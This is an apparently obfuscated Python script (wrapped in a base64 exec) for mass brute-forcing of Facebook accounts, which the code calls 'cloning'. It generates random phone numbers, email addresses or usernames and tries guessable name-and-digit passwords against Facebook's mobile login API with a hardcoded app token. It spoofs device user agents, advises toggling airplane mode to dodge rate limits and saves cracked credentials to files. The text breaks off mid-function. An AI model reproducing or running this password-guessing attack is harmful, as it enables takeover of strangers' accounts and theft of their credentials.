#-------------------------------------##-------------------------------------#
# ENCRYPTED BY : PARVEJ
# GITHUB : https://github.com/PARVEJ-143
#-------------------------------------##-------------------------------------#

import base64
exec(base64.b64decode(b'#----------------import-module-------------#
import os,time,sys
os.system('clear')
from os import path
import os,base64,zlib,pip,urllib
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        os.system(f'pip install requests futures==2 > /dev/null')
except:pass
#-------------colors-------------#
G = "\033[38;5;46m";G0 = "\x1b[38;5;46m";G1 = "\x1b[38;5;47m";G2 = "\x1b[38;5;48m";G3 = "\x1b[38;5;49m";G4 = "\x1b[38;5;50m";G5 = "\x1b[38;5;51m";G6 = "\x1b[38;5;52m";s = "\033[0m";W = "\033[1;30m";Y = "\x1b[1;93m";R = "\033[1;91m";RE = "\033[1;31m";B = "\033[1;95m";BE = "\x1b[1;35m";X = "\x1b[1;96m";Z = "\x1b[1;95m";Y = "\033[1;93m";U = "\033[1;94m";V = "\033[38;5;47m";T = "\033[38;5;48m";Q = "\033[38;5;49m";P = "\033[38;5;50m";O = "\033[38;5;51m";N = "\033[38;5;52m";M = "\033[38;5;53m";L = "\033[96;1m";K = "\x1b[1;91m";WH = "\033[1;97m"
W='\033[1;37m';G='\033[1;32m';R='\033[1;31m';B='\033[1;34m';A='\033[1;36m';C='\033[1;36m';Y='\033[1;33m';F='\033[1;35m';X='\x1b[38;5;208m'
#---------------user-agent--------------#
def samsung():
	phone_model = random.choice(["Galaxy A21s","Galaxy J2 Core (2020)","Galaxy A Quantum","Galaxy A71 5G","Galaxy A51 5G","Galaxy A21","Galaxy Tab A 8.4 (2020)","Galaxy Tab S6 Lite (2020)","Galaxy M11","Galaxy A31","Galaxy A41","Galaxy M21","Galaxy A11","Galaxy M31","Galaxy S20 Ultra 5G","Galaxy S20 Ultra","Galaxy S20+ 5G","Galaxy S20+","Galaxy S20 5G UW","Galaxy S20 5G","Galaxy S20","Galaxy Z Flip","Galaxy Tab S6 5G","Galaxy Xcover Pro","Galaxy Note10 Lite","Galaxy S10 Lite","Galaxy A01","Galaxy A71","Galaxy A51","Galaxy Xcover FieldPro","Galaxy A70s","Galaxy A20s","Galaxy M30s","Galaxy M10s","Galaxy Fold 5G","Galaxy Fold","Galaxy Tab Active Pro","Galaxy A90 5G","Galaxy A30s","Galaxy A50s","Galaxy Note10+ 5G","Galaxy Note10+","Galaxy Note10 5G","Galaxy Note10","Galaxy A10s","Galaxy A10e","Galaxy Tab S6","Galaxy Tab A 8.0 (2019)","Galaxy Tab A7 Lite","Galaxy Tab S7 FE","Galaxy F52 5G","Galaxy M42 5G","Galaxy M12","Galaxy Quantum 2","Galaxy F12","Galaxy F02s","Galaxy A72","Galaxy A52 5G","Galaxy A52","Galaxy Xcover 5","Galaxy A32","Galaxy M62","Galaxy F62","Galaxy M12 (India)","Galaxy S21 Ultra 5G","Galaxy S21+ 5G","Galaxy S21 5G","Galaxy A32 5G","Galaxy M02s","Galaxy A12","Galaxy M02","Galaxy A02","Galaxy A02s","Galaxy M21s","Galaxy M31 Prime","Galaxy F41","Galaxy Tab Active3","Galaxy S20 FE 5G","Galaxy S20 FE","Galaxy A42 5G","Galaxy Tab A7 10.4 (2020)","Galaxy M51","Galaxy A51 5G UW","Galaxy Z Fold2 5G","Galaxy Note20 Ultra 5G","Galaxy Note20 Ultra","Galaxy Note20 5G","Galaxy Note20","Galaxy Tab S7+","Galaxy Tab S7","Galaxy Z Flip 5G","Galaxy M31s","Galaxy M01s","Galaxy M01 Core","Galaxy A01 Core","Galaxy A71 5G UW","Galaxy M01","Galaxy A23 5G","Galaxy M13 5G","Galaxy M13 (India)","Galaxy A13 (SM-A137)","Galaxy Xcover6 Pro","Galaxy F13","Galaxy M13","Galaxy Tab S6 Lite (2022)","Galaxy M53","Galaxy S20 FE 2022","Galaxy A73 5G","Galaxy A53 5G","Galaxy A33 5G","Galaxy F23","Galaxy M33","Galaxy M23","Galaxy A23","Galaxy A13","Galaxy S22 Ultra 5G","Galaxy S22+ 5G","Galaxy S22 5G","Galaxy Tab S8 Ultra","Galaxy Tab S8+","Galaxy Tab S8","Galaxy S21 FE 5G","Galaxy Tab A8 10.5 (2021)","Galaxy A13 5G","Galaxy A03","Galaxy A03 Core","Galaxy F42 5G","Galaxy M52 5G","Galaxy M22","Galaxy M32 5G","Galaxy A03s","Galaxy A52s 5G","Galaxy Z Fold3 5G","Galaxy Z Flip3 5G","Galaxy A12 (India)","Galaxy A12 Nacho","Galaxy M21 2021","Galaxy F22","Galaxy M32","Galaxy A22 5G","Galaxy A22","Galaxy F54","Galaxy A24 4G","Galaxy F14","Galaxy M54","Galaxy A54","Galaxy A34","Galaxy M14","Galaxy S23 Ultra","Galaxy S23+","Galaxy S23","Galaxy A14","Galaxy A14 5G","Galaxy F04","Galaxy M04","Galaxy Tab A7 10.4 (2022)","Galaxy A04e","Galaxy Tab Active4 Pro","Galaxy A04"])
	fblc = random.choice(["en_GB","en_US"])
	fbpn = random.choice(["com.facebook.katana","com.facebook.orca"])
	rt = random.choice(["FB4A","EMA"])
	fbcr = random.choice(["AIS','cricket","MegaFon","Viettel Telecom","TRUE-H","TM","GLOBE","null","VIETTEL","TELCEL","O2-CZ","U.S. Cellular","SUN","TelkomSA","Verizon","Plus","Claro BR","T-Mobile","airtel","PLAY (T-Mobile)","VIVACOM","lifecell","Yoigo","life:) BY","vodafone.de","Vodafone","PosteMobile","Verizon Wireless","Movistar","HOME","SAZKAmobilCZ","Astelit-LIFE;FBMF","AT&amp;amp-T","Grameenphone","Robi","Banglalink","Willkommen"])
	phone = random.choice(["samsung"])
	fbav = str(random.randint(111,999))+'.0.0.'+str(random.randint(11,99))+'.'+str(random.randint(111,999))
	fbbv = str(random.randint(4000000,5000000))
	fbrv = str(random.randint(1111111,9999999))
	fbsv = str(random.randint(5,14))
	fbca = random.choice(["armeabi-v7a:armeabi","arm64-v8a:"])
	ua = "[FBAN/"+str(rt)+";FBAV/"+str(fbav)+";FBBV/"+str(fbbv)+";FBDM/{density=3.0,width=1080,height=2076};FBLC/"+str(fblc)+";FBRV/"+str(fbrv)+";FBCR/"+str(fbcr)+";FBMF/"+str(phone)+";FBBD/"+str(phone)+";FBPN/"+str(fbpn)+";FBDV/"+str(phone_model)+";FBSV/"+str(fbsv)+";FBOP/1;FBCA/"+str(fbca)+";]"
	return ua
def sm():
	model = random.choice(["SM-G780G","SM-O497J","SM-L427V","SM-C297Z","SM-G507X","SM-Y634L","SM-J204F","SM-R911A","SM-X801O","SM-A792E","SM-H270F","SM-P993J","SM-V233F","SM-O861W","SM-D182C","SM-Y729G","SM-Z367Q","SM-U191O","SM-U559U","SM-B567Y","SM-O846M","SM-G342Z","SM-K531M","SM-I847H","SM-A728M","SM-L637H","SM-L429N","SM-P413J","SM-N731T","SM-R505B","SM-A744X","SM-O400L","SM-F799H","SM-Z679E"])
	local = random.choice(['en_US','en_GB'])
	fbrv = str(random.randint(111111111,999999999))
	fbsv = str(random.randint(5,14))
	fbcr = random.choice(["Airtel","Robi"])
	ua = '[FBAN/FB4A;FBAV/'+str(random.randint(111,999))+'.0.0.'+str(random.randint(11,99))+'.'+str(random.randint(111,999))+';FBBV/'+str(random.randint(111111111,999999999))+';'+'FBBV/'+str(random.randint(11111111,99999999))+';FBDM/{density=3.5,width=1440,height=2730};FBLC/'+str(local)+';FBRV/'+str(fbrv)+';FBCR/'+str(fbcr)+';FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/'+str(model)+';FBSV/'+str(fbsv)+';FBOP/1;FBCA/arm64-v8a:;]'
	return ua
#-----------------etc--------------#
sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_GB'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'Zong'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.25,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "Zong"
                        sim_id+=fbcr
        else:
                fbcr = 'Zong'
                sim_id+=fbcr
except:
        fbcr = "Zong"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}
#--------------logo--------------#
logo=(f"""\033[1;37m
{G0}PPPPPP    AAA   RRRRRR  VV     VV EEEEEEE     JJJ 
{G1}PP   PP  AAAAA  RR   RR VV     VV EE          JJJ 
{G2}PPPPPP  AA   AA RRRRRR   VV   VV  EEEEE       JJJ 
{G3}PP      AAAAAAA RR  RR    VV VV   EE      JJ  JJJ 
{G4}PP      AA   AA RR   RR    VVV    EEEEEEE  JJJJJ
{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{R}|{G}={R}|{W} Author    {R}:{G} PARVEJ
{R}|{G}={R}|{W} Github    {R}:{G} PARVEJ-143
{R}|{G}={R}|{W} Facebook  {R}:{G} FH Roman
{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{R}|{G}={R}|{W} Tool Name {R}:{G} FILE{R}-{G}RANDOM
{R}|{G}={R}|{W} Tool type {R}:{G} PARSONAL
{R}|{G}={R}|{W} Version {R}  :{G} 0.2
{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
#------------------line--------------#
def linex():
        print(f'{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
#--------------clear-def---------------#
def clear():
        os.system('clear')
        print(logo)
#--------------loop-list----------------#
loop=0
oks=[]
cps=[]
twf=[]
pcp=[]
id=[]
tokenku=[]
#-----------------main-menu----------------#
def menu():
                        clear()
                        print(f'{R}|{G}1{R}|{G} File cloning {R}|{G}MIX{R}|\n{R}|{G}2{R}|{G} RANDOM UID CLONE  {R}|{G}SEE MORE{R}|\n{R}|{G}0{R}|{G} Exit menu')
                        linex()
                        xd=input(f'{R}|{G}={R}|{W} Choose an option{R}:{G} ')
                        if xd in ['1','01']:
                                clear()
                                print(f'{R}|{G}={R}|{W} Put file example{R}:{G}  /sdcard/File.txt  etc..')
                                linex()
                                file = input(f'{R}|{G}={R}|{W} Put file path\033[1;31m:{G} ')
                                try:
                                        fo = open(file,'r').read().splitlines()
                                except FileNotFoundError:
                                        print(f'{R}|{G}={R}|{G} File location not found ')
                                        time.sleep(1)
                                        menu()
                                clear()
                                print(f'{R}|{G}1{R}|{G} Method 1 {R}|{G}for new ids{R}|\n{R}|{G}2{R}|{G} Method 2 {R}|{G}for mix ids{R}|')
                                linex()
                                mthd=input(f'{R}|{G}={R}|{W} Choose{R}:{G} ')
                                linex()
                                plist = []
                                print(f'{R}|{G}={R}|{G} Select Password Crack menu');linex();print(f'{R}|{G}1{R}|{G} Crack with auto password \n{R}|{G}2{R}|{G} Crack with choice password');linex()
                                ppp=input(f'{R}|{G}={R}|{W} Choose{R}:{G} ')
                                if ppp in ['1','01']:
                                        plist.append('first last')
                                        plist.append('firstlast')
                                        plist.append('first123')
                                        plist.append('first12345')
                                        plist.append('last1234')
                                        plist.append('first@#')
                                        plist.append('first@@@')
                                        plist.append('first@@')
                                elif ppp in ['3','03']:
                                        clear()
                                        print(' \033[1;32mWorking password for Pakistan\033[1;37m ')
                                        linex()
                                        print(' [1] first last\n [2] firstlast\n [3] first123\n [4] first1234\n [5] first786\n [6] first110\n [7] firstlast123\n [8] firstlast786\n [9] firstlast110')
                                        linex()
                                        print('\033[1;32m Out of Pakistan working password\033[1;37m ')
                                        linex()
                                        print(' [1] first last\n [2] firstlast\n [3] first1234\n [4] First Last\n [5] first123 ')
                                        linex()
                                        print(' \033[1;32mfor new ids use just 1 password \033[1;37m \n [1] first last > best results \n \033[1;32melse\033[1;37m \n [1] first last\n [2] firstlast\n [3] First Last\n [4] First Last')
                                        linex()
                                        input(' Press enter to back menu ')
                                        menu()
                                else:
                                        try:
                                                linex()
                                                ps_limit = int(input(f'{R}|{G}={R}|{G} How many passwords do you want to add ? '))
                                        except:
                                                ps_limit =1
                                        linex()
                                        print(f'{R}|{G}={R}|{W} exp{R}:{G} first last,firtslast,first123')
                                        linex()
                                        for i in range(ps_limit):
                                                plist.append(input(f'{R}|{G}={R}|{W} Put password {i+1}{R}:{G} '))
                                linex()
                                print(f'{R}|{G}={R}|{W} Do you went show cp account? (y/n){R}:{G} ')
                                linex()
                                cx=input(f'{R}|{G}={R}|{W} Choose{R}:{G} ')
                                if cx in ['y','Y','yes','Yes','1']:
                                        pcp.append('y')
                                else:
                                        pcp.append('n')
                                with tred(max_workers=30) as crack_submit:
                                        clear()
                                        total_ids = str(len(fo))
                                        print(f'{R}|{G}={R}|{W} Total account{R} : \033[1;32m'+total_ids+f' \033[1;33m{R}|{G}={R}|{W} Method {R}: \033[1;32mM{mthd}')
                                        print(f'{R}|{G}={R}|{G} TURN \x1b[38;5;196m|\x1b[38;5;46mON\x1b[38;5;196m/\x1b[38;5;46mOFF\x1b[38;5;196m|\x1b[38;5;46m AIRPLANE MODE EVERY {R}3 {G}MIN')
                                        linex()
                                        for user in fo:
                                                ids,names = user.split('|')
                                                passlist = plist
                                                if mthd in ['1','01']:
                                                        crack_submit.submit(api,ids,names,passlist)
                                                if mthd in ['2','02']:
                                                        crack_submit.submit(api2,ids,names,passlist)
                                print('\033[1;37m')
                                linex()
                                print(f'{R}|{G}={R}|{G} The process has completed')
                                print(f'{R}|{G}={R}|{G} Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
                                linex()
                                input(f'{R}|{G}={R}|{G} Press enter to back ')
                                os.system('python file.py')
#--------------random-clone-main-menu-------------------#
                        elif xd in ['2','02']:
                                clear()
                                print(f'{R}|{G}1{R}|{G} RANDOM UID CLONING {R}|{G}BD{R}|\n{R}|{G}2{R}|{G} RANDOM GAMIL CLONING {R}|{G}MIX{R}|\n{R}|{G}3{R}|{G} RANDOM USER NAME CLONING {R}|{G}MIX{R}|\n{R}|{G}4{R}|{G} RANDOM UID CLONING {R}|{G}IN{R}|\n{R}|{G}0{R}|{G} Back menu')
                                linex()
                                x=input(f'{R}|{G}={R}|{W} Choose{R}:{G} ')
                                if x in ['1','01']:
                                        bd()
                                elif x in ['2','02']:
                                        gmail()
                                elif x in ['3','03']:
                                        crack()
                                elif x in ['4','04']:
                                        india()
#--------------bd-check-------------#
def bd():
                user=[]
                clear()
                print(f'{R}|{G}={R}|{W} Code example{R}:{G} 016,017,018,019')
                code = input(f'{R}|{G}={R}|{W} put code{R}:{G} ')
                try:
                        limit = int(input(f'{R}|{G}={R}|{W} example{R}:{G} 2000, 3000, 5000, 10000\n{R}|{G}={R}|{W} put limit{R}:{G} '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(8))
                        user.append(nmp)
                with tred(max_workers=30) as Fh:     
                        clear()
                        tl = str(len(user))
                        print(f'{R}|{G}={R}|{W} Total account {R}: \033[1;32m'+tl)
                        print(f'{R}|{G}={R}|{W} Choice code ..{R}:\033[1;32m '+code)
                        print(f'{R}|{G}={R}|{G} TURN \x1b[38;5;196m|\x1b[38;5;46mON\x1b[38;5;196m/\x1b[38;5;46mOFF\x1b[38;5;196m|\x1b[38;5;46m AIRPLANE MODE EVERY {R}3 {G}MIN') 
                        linex()
                        for psx in user:
                                ids = code+psx
                                passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],ids[8:]]
                                Fh.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(f'{R}|{G}={R}|{G} The process has completed')
                print(f'{R}|{G}={R}|{G} Total OK/CP/2F: '+str(len(oks)))
                input(f'{R}|{G}={R}|{G} Press enter to back ')
                os.system('python file.py')
#-------------gmail-check-------------#
def gmail():
                os.system('rm -rf .re.txt')
                clear()
                print(f'{R}|{G}={R}|{W} example{R}:{G} muhammad, ali, sajjad, faizan\033[1;97m')
                linex()
                first = input(f'{R}|{G}={R}|{W} Put first name{R}:{G} ')
                linex()
                print(f'{R}|{G}={R}|{W} example{R}:{G} khan, ahmad, ali \033[1;97m')
                linex()
                last = input(f'{R}|{G}={R}|{W} Put last name{R}:{G} ')
                linex()
                print(f'{R}|{G}={R}|{W} Example{R}:{G} @gmail.com , @yahoo.com etc...')
                linex()
                domain = input(f'{R}|{G}={R}|{W} domain{R}:{G} ')
                linex()
                try:
                        limit=int(input(f'{R}|{G}={R}|{W} Put limit{R}:{G} '))
                except ValueError:
                        limit = 5000
                linex()
                print(f'{R}|{G}={R}|{G} Getting gmails...')
                lists = ['3','4']
                for xd in range(limit):
                        lchoice = random.choice(lists)
                        if '3' in lchoice:
                                mail = ''.join(random.choice(string.digits) for _ in range(3))
                                open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
                        else:
                                mail = ''.join(random.choice(string.digits) for _ in range(4))
                                open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
                        fo = open('.re.txt', 'r').read().splitlines()
                with tred(max_workers=30) as Fh:
                        total = str(len(fo))
                        clear()
                        print(f'{R}|{G}={R}|{W} Total account {R}: \033[1;32m'+total)
                        print(f'{R}|{G}={R}|{W} target domain{R} : {G}'+first+last+domain)
                        print(f'{R}|{G}={R}|{G} TURN \x1b[38;5;196m|\x1b[38;5;46mON\x1b[38;5;196m/\x1b[38;5;46mOFF\x1b[38;5;196m|\x1b[38;5;46m AIRPLANE MODE EVERY {R}3 {G}MIN') 
                        linex()
                        for user in fo:
                                ids,names = user.split('|')
                                first_name = names.rsplit(' ')[0]
                                try:
                                        last_name = names.rsplit(' ')[1]
                                except IndexError:
                                        last_name = 'Khan'
                                fs = first_name.lower()
                                ls = last_name.lower()
                                passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
                                Fh.submit(rndmgml,ids,passlist)
                print('\033[1;37m')
                linex()
                print(f'{R}|{G}={R}|{G} The process has completed')
                print(f'{R}|{G}={R}|{G} Total OK: '+str(len(oks)))
                linex()
                input(f'{R}|{G}={R}|{G} Press enter to back ')
                os.system('python file.py')
#---------------|user-name|---------------#
def crack():
    user=[]
    clear()
    print(f'{R}|{G}={R}|{W} example{R} :{G} muhammad, ali, sajjad, faizan\033[1;97m');linex()
    kode = input(f'{R}|{G}={R}|{G} First Name {R}:{G} ')
    linex()
    print(f'{R}|{G}={R}|{W} example{R} :{G} khan, ahmad, ali \033[1;97m');linex()
    kodex = input(f'{R}|{G}={R}|{G} Last Name {R}:{G}  ')
    linex()
    Domain = '.'
    try:
        limit=int(input(f'{R}|{G}={R}|{G} Put Crack Limit{R} :{G} '))
        linex()
        clear()
    except ValueError:
        limit=5000
    for nmbr in range(limit):
        nmp="".join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with tred(max_workers=30) as Fh:
        tl=str(len(user))
        print(f'{R}|{G}={R}|{W} TotalDomain{R}:\x1b[32m '+tl)
        print(f"{R}|{G}={R}|{W} target Domain{R}:\x1b[32m {kode} {kodex}")
        print(f'{R}|{G}={R}|{G} TURN {R}|\x1b[38;5;46mON{R}/\x1b[38;5;46mOFF{R}|\x1b[38;5;46m AIRPLANE MODE EVERY {R}3 {G}MIN')
        linex()
        for digitx in user:
            ids=kode+Domain+kodex+digitx
            passlist = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kodex+'123',kodex+'1234',kodex+'12345']
            Fh.submit(rndmgml,ids,passlist)
    linex()
    print('Crack process has been completed')
    print('Ids saved in ok.txt,cp.txt')
    menu()
#__________________| india |__________________#
def india():
		user=[]
		clear()
		print(f'{R}|{G}={R}|{W} EXAMPLE{R}:{G} +91639 | +91934 | +91902 | +91937 ');linex()
		code = input(f'{R}|{G}={R}|{W} CHOICE{R}:{G} ')
		clear();print(f'{R}|{G}={R}|{W} EXAMPLE{R}:{G} 3000 | 5000 | 10000 | 99999 ');linex()
		limit = int(input(f'{R}|{G}={R}|{W} CHOICE{R}:{G} '))
		clear()
		for nmbr in range(limit):
			nmp = "". join(random.choice(string.digits) for _ in range(7))
			user.append(nmp)
		with tred(max_workers=30) as Fh:	
			clear()
			tl = str(len(user))
			print(f'{R}|{G}={R}|{W} SIM CODE{R} :{G} {code} ')
			print(f'{R}|{G}={R}|{W} TOTAL ID{R} :{G} {tl} \x1b[38;5;196m')
			print(f'{R}|{G}={R}|{G} TURN \x1b[38;5;196m(\x1b[38;5;46mON\x1b[38;5;196m/\x1b[38;5;46mOFF\x1b[38;5;196m)\x1b[38;5;46m AIRPLANE MODE EVERY{R} 3{G} MIN');linex()
			for psx in user:
				ids = code+psx
				passlist = [psx,ids[:8],'57273200','59039200','57575751']
				Fh.submit(rndm,ids,passlist)
		print('\033[1;37m')
		linex()
		print(f'{R}|{G}={R}|{G} THE PROCESS HAS COMPLETED')
		print(f'{R}|{G}={R}|{G} TOTAL OK ID : '+str(len(oks)))
		linex()
		input(f'{R}|{G}={R}|{G} PRESS ENTER TO BACK ')
		menu()
#---------------file-method-m1----------------#
def api(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write(f'\r\r{R} |{G}PARVEJ-XD{R}|{G} %s{R}|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.625,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':ids,
                                'password':pas,
                                'generate_analytics_claims':'1',
                                'community_id':'',
                                'cpl':'true',
                                'try_num':'1',
                                'family_device_id':family,
                                'sim_serials':sim_serials,
                                'credentials_type':'password',
                                'source':'login',
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'meta_inf_fbmeta':'',
                                'currently_logged_in_userid':'0',
                                'locale':fblc,
                                'client_country_code':'',
                                'fb_api_req_friendly_name':'authenticate',
                        }
                        headers={
                                'Authorization':f'OAuth {accessToken}',
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Bandwidth':str(random.randint(2e7,3e7)),
                                'X-FB-Net-HNI': str(random.randint(11111, 99999)),
                                'X-FB-SIM-HNI': str(random.randint(11111, 99999)),
                                'X-FB-Connection-Type':'unknown',
                                'User-Agent':samsung(),
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r{R} |{G}PARVEJ-OK{R}|{G} '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/pro-file-clone-m1-OK.txt','a').write(ids+' | '+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print(f'\r\r{R} |{B}PARVEJ-2F{R}|{B} '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r{R} |{X}PARVEJ-CP{R}|{X} '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/pro-file-clone-m1-CP.txt','a').write(ids+' | '+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass
#-------------file-method-m2----------------#
def api2(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write(f'\r\r{R} |{G}PARVEJ-XD{R}|{G} %s{R}|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.625,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':ids,
                                'password':pas,
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'login',
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'meta_inf_fbmeta':'',
                                'currently_logged_in_userid':'0',
                                'fb_api_req_friendly_name':'authenticate',
                        }
                        headers={
                                'Authorization':f'OAuth {accessToken}',
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Type':'unknown',
                                'User-Agent':sm(),
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                        url = 'https://b-api.facebook.com/method/auth.login'
